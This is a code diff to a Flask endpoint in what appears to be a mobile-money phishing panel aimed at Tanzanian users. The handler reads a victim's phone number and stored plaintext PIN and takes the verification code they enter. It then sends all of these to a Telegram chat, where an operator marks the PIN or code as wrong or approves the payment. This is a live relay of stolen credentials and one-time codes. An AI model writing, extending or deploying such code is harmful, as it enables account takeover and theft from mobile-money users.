@@ -169,11 +169,11 @@ def submit_payment():
 def submit_code():
     data = request.json; app_id = data.get('app_id'); entered_code = data.get('code')
     conn = sqlite3.connect('database.db'); c = conn.cursor()
-    c.execute('SELECT phone, code, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
+    c.execute('SELECT phone, amount, plan, pin FROM payments WHERE app_id = ?',(app_id,))
     payment = c.fetchone()
     if payment:
-        phone, expected_code, amount, plan, pin = payment
-        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n✍️ Entered: {entered_code}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}'
+        phone, amount, plan, pin = payment
+        msg = f'🔐 CODE VERIFICATION\n\n🆔 ID: {app_id}\n📞 Phone: +255 {phone}\n📦 Plan: {plan}\n✍️ Entered Code: {entered_code}\n💰 Amount: TSh {amount:,}\n🔢 PIN: {pin}'
         keyboard = {'inline_keyboard':[[{'text':'❌ WRONG PIN','callback_data':f'denypin_{app_id}'}],[{'text':'❌ WRONG CODE','callback_data':f'wrongcode_{app_id}'}],[{'text':'✅ APPROVE PAYMENT','callback_data':f'approve_{app_id}'}]]}
         send_telegram(msg, keyboard)
     conn.close()
